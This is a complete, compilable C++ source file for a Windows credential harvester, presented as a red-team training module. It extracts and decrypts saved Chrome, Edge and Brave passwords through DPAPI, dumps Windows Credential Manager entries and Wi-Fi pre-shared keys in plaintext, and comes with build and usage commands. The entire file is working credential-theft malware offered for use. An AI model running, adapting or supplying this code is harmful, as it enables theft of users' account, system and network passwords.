/*
  cred_harvester.cpp — Module 11 workable (Credential Harvester)
  ==============================================================
  Extracts saved credentials from Chrome/Edge, Windows Credential Manager,
  and Wi-Fi profiles.  Same techniques red teams use post-exploitation.

  Compile:
    g++ -std=c++17 -O2 -s -o cred_harvester.exe cred_harvester.cpp \
        -ladvapi32 -lcrypt32 -lwlanapi -lole32 -lshlwapi

  Commands:
    cred_harvester.exe all            run all modules
    cred_harvester.exe chrome         Chrome/Edge saved passwords (DPAPI)
    cred_harvester.exe credman        Windows Credential Manager
    cred_harvester.exe wifi           Wi-Fi saved PSKs
    cred_harvester.exe dpapi <hex>    DPAPI-decrypt a hex-encoded blob
*/
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wincrypt.h>
#include <wincred.h>
#include <wlanapi.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <cstdio>

#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"crypt32.lib")
#pragma comment(lib,"wlanapi.lib")
#pragma comment(lib,"ole32.lib")

// ── helpers ───────────────────────────────────────────────────────────────────
static std::string toHex(const uint8_t* d, size_t n){
    std::string s; char b[3];
    for(size_t i=0;i<n;++i){snprintf(b,sizeof(b),"%02X",d[i]);s+=b;}
    return s;
}
static std::vector<uint8_t> fromHex(const std::string& s){
    std::vector<uint8_t> v;
    for(size_t i=0;i+1<s.size();i+=2){
        uint8_t b=(uint8_t)strtoul(s.substr(i,2).c_str(),nullptr,16); v.push_back(b);
    }
    return v;
}

// ── DPAPI decrypt ─────────────────────────────────────────────────────────────
static std::vector<uint8_t> dpapiDecrypt(const std::vector<uint8_t>& encrypted){
    DATA_BLOB in{(DWORD)encrypted.size(),(BYTE*)encrypted.data()},out{};
    if(!CryptUnprotectData(&in,nullptr,nullptr,nullptr,nullptr,0,&out)) return {};
    std::vector<uint8_t> r(out.pbData,out.pbData+out.cbData);
    LocalFree(out.pbData); return r;
}

static void cmdDpapi(const char* hexBlob){
    auto encrypted=fromHex(std::string(hexBlob));
    auto plain=dpapiDecrypt(encrypted);
    if(plain.empty()){printf("[-] DPAPI decrypt failed (error %lu)\n",GetLastError());return;}
    printf("[+] Decrypted (%zu bytes):\n",plain.size());
    // Try print as string
    bool printable=true;
    for(uint8_t b:plain) if(b<0x20&&b!='\t'&&b!='\n'&&b!='\r'){printable=false;break;}
    if(printable) printf("    Text: %.*s\n",(int)plain.size(),(char*)plain.data());
    else printf("    Hex: %s\n",toHex(plain.data(),plain.size()).c_str());
}

// ── Chrome / Edge password extraction ────────────────────────────────────────
// Chrome stores passwords in an SQLite DB. We copy the DB (Chrome locks it)
// and invoke sqlite3.exe to extract rows, then DPAPI-decrypt each password.
// If sqlite3.exe is not in PATH, prints the copy path for manual extraction.
static std::string runSqlite(const char* dbPath, const char* sql){
    // Copy DB first (Chrome locks original)
    char tmp[MAX_PATH]={}; GetTempPathA(MAX_PATH,tmp);
    std::string copy=std::string(tmp)+"chrome_creds_tmp.db";
    CopyFileA(dbPath,copy.c_str(),FALSE);
    // Run sqlite3
    std::string cmd="sqlite3.exe \""+copy+"\" \""+sql+"\"";
    std::string out;
    SECURITY_ATTRIBUTES sa{sizeof(sa),0,TRUE};
    HANDLE hR=0,hW=0; if(!CreatePipe(&hR,&hW,&sa,0)) return "";
    SetHandleInformation(hR,HANDLE_FLAG_INHERIT,0);
    STARTUPINFOA si{sizeof(si)}; si.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE; si.hStdOutput=hW; si.hStdError=hW;
    PROCESS_INFORMATION pi{};
    char* cl=new char[cmd.size()+1]; memcpy(cl,cmd.c_str(),cmd.size()+1);
    if(CreateProcessA(0,cl,0,0,TRUE,CREATE_NO_WINDOW,0,0,&si,&pi)){
        CloseHandle(hW);
        char buf[4096];DWORD rd=0;
        while(ReadFile(hR,buf,sizeof(buf)-1,&rd,0)&&rd>0) out.append(buf,rd);
        WaitForSingleObject(pi.hProcess,5000);
        CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
    } else {CloseHandle(hW);}
    delete[]cl; CloseHandle(hR);
    DeleteFileA(copy.c_str());
    return out;
}

static void extractBrowserCreds(const char* profileName, const char* dbPath){
    printf("\n[%s] %s\n",profileName,dbPath);
    if(GetFileAttributesA(dbPath)==INVALID_FILE_ATTRIBUTES){printf("  (not found)\n");return;}
    std::string rows=runSqlite(dbPath,"SELECT origin_url,username_value,hex(password_value) FROM logins");
    if(rows.empty()){
        printf("  sqlite3 not in PATH — copy manually:\n  %s\n",dbPath);
        return;
    }
    // Parse pipe-separated rows: url|user|hexpass
    std::istringstream ss(rows); std::string line;
    int count=0;
    while(std::getline(ss,line)){
        if(line.empty()) continue;
        // sqlite3 default separator is |
        size_t p1=line.find('|'),p2=line.rfind('|');
        if(p1==std::string::npos||p1==p2) continue;
        std::string url=line.substr(0,p1);
        std::string user=line.substr(p1+1,p2-p1-1);
        std::string hexpw=line.substr(p2+1);
        // DPAPI decrypt password
        auto enc=fromHex(hexpw);
        auto plain=dpapiDecrypt(enc);
        std::string pw(plain.begin(),plain.end());
        if(!user.empty()||!pw.empty()){
            printf("  URL:  %s\n  User: %s\n  Pass: %s\n\n",url.c_str(),user.c_str(),pw.c_str());
            ++count;
        }
    }
    if(!count) printf("  (no credentials stored)\n");
}

static void cmdChrome(){
    char appData[MAX_PATH]={}; SHGetFolderPathA(nullptr,CSIDL_LOCAL_APPDATA,nullptr,0,appData);
    struct {const char* name; std::string path;} browsers[]={
        {"Chrome",  std::string(appData)+"\\Google\\Chrome\\User Data\\Default\\Login Data"},
        {"Edge",    std::string(appData)+"\\Microsoft\\Edge\\User Data\\Default\\Login Data"},
        {"Brave",   std::string(appData)+"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"},
    };
    for(auto& b:browsers) extractBrowserCreds(b.name,b.path.c_str());
}

// ── Windows Credential Manager ────────────────────────────────────────────────
static void cmdCredman(){
    printf("=== Windows Credential Manager ===\n\n");
    PCREDENTIALA* creds=nullptr; DWORD count=0;
    if(!CredEnumerateA(nullptr,0,&count,&creds)){
        printf("[-] CredEnumerate failed: %lu\n",GetLastError()); return;
    }
    for(DWORD i=0;i<count;++i){
        auto* c=creds[i];
        std::string pw;
        if(c->CredentialBlobSize>0&&c->CredentialBlob){
            // Passwords stored as wide chars or UTF-8
            if(c->Type==CRED_TYPE_GENERIC||c->Type==CRED_TYPE_DOMAIN_PASSWORD){
                // Check if wide
                bool wide=false;
                for(DWORD j=0;j+1<c->CredentialBlobSize;j+=2)
                    if(c->CredentialBlob[j+1]==0) {wide=true;break;}
                if(wide){
                    std::wstring ws((wchar_t*)c->CredentialBlob,c->CredentialBlobSize/2);
                    pw=std::string(ws.begin(),ws.end());
                } else {
                    pw=std::string((char*)c->CredentialBlob,c->CredentialBlobSize);
                }
            }
        }
        printf("Target:   %s\n",c->TargetName?c->TargetName:"(null)");
        printf("User:     %s\n",c->UserName?c->UserName:"(null)");
        printf("Type:     %lu\n",c->Type);
        printf("Password: %s\n\n",pw.empty()?"(encrypted/binary)":pw.c_str());
    }
    printf("[*] %lu credential(s)\n",count);
    CredFree(creds);
}

// ── Wi-Fi PSKs ────────────────────────────────────────────────────────────────
static std::string wcsToStr(const wchar_t* w){
    if(!w) return "";
    int n=WideCharToMultiByte(CP_UTF8,0,w,-1,nullptr,0,nullptr,nullptr);
    std::string s(n-1,0);
    WideCharToMultiByte(CP_UTF8,0,w,-1,&s[0],n,nullptr,nullptr);
    return s;
}

static void cmdWifi(){
    printf("=== Wi-Fi Saved PSKs ===\n\n");
    HANDLE hClient=nullptr; DWORD ver=0;
    if(WlanOpenHandle(2,nullptr,&ver,&hClient)!=ERROR_SUCCESS){
        printf("[-] WlanOpenHandle failed\n"); return;
    }
    PWLAN_INTERFACE_INFO_LIST ifaces=nullptr;
    WlanEnumInterfaces(hClient,nullptr,&ifaces);
    if(!ifaces){WlanCloseHandle(hClient,nullptr);return;}

    for(DWORD i=0;i<ifaces->dwNumberOfItems;++i){
        PWLAN_PROFILE_INFO_LIST profiles=nullptr;
        if(WlanGetProfileList(hClient,&ifaces->InterfaceInfo[i].InterfaceGuid,
                               nullptr,&profiles)!=ERROR_SUCCESS) continue;
        for(DWORD j=0;j<profiles->dwNumberOfItems;++j){
            PWSTR xml=nullptr; DWORD flags=WLAN_PROFILE_GET_PLAINTEXT_KEY; DWORD access=0;
            DWORD rc=WlanGetProfile(hClient,&ifaces->InterfaceInfo[i].InterfaceGuid,
                                     profiles->ProfileInfo[j].strProfileName,
                                     nullptr,&xml,&flags,&access);
            std::string name=wcsToStr(profiles->ProfileInfo[j].strProfileName);
            if(rc==ERROR_SUCCESS&&xml){
                std::wstring wxs(xml);
                std::string xs(wxs.begin(),wxs.end());
                // Extract <keyMaterial>...</keyMaterial>
                std::string psk;
                size_t s=xs.find("<keyMaterial>"),e=xs.find("</keyMaterial>");
                if(s!=std::string::npos&&e!=std::string::npos)
                    psk=xs.substr(s+13,e-(s+13));
                printf("SSID: %-30s  PSK: %s\n",name.c_str(),
                       psk.empty()?"(no key / enterprise)":psk.c_str());
                WlanFreeMemory(xml);
            } else {
                printf("SSID: %-30s  PSK: (requires elevation)\n",name.c_str());
            }
        }
        WlanFreeMemory(profiles);
    }
    WlanFreeMemory(ifaces); WlanCloseHandle(hClient,nullptr);
}

// ── main ─────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]){
    if(argc<2){
        puts("cred_harvester — Module 11 workable\n"
             "  all             run all modules\n"
             "  chrome          Chrome/Edge saved passwords (DPAPI)\n"
             "  credman         Windows Credential Manager\n"
             "  wifi            Wi-Fi saved PSKs\n"
             "  dpapi <hexblob> DPAPI-decrypt a hex-encoded blob");
        return 1;
    }
    std::string cmd(argv[1]);
    if(cmd=="all"){cmdChrome();cmdCredman();cmdWifi();}
    else if(cmd=="chrome")          cmdChrome();
    else if(cmd=="credman")         cmdCredman();
    else if(cmd=="wifi")            cmdWifi();
    else if(cmd=="dpapi"&&argc>=3)  cmdDpapi(argv[2]);
    else {fprintf(stderr,"Unknown command\n");return 1;}
    return 0;
}
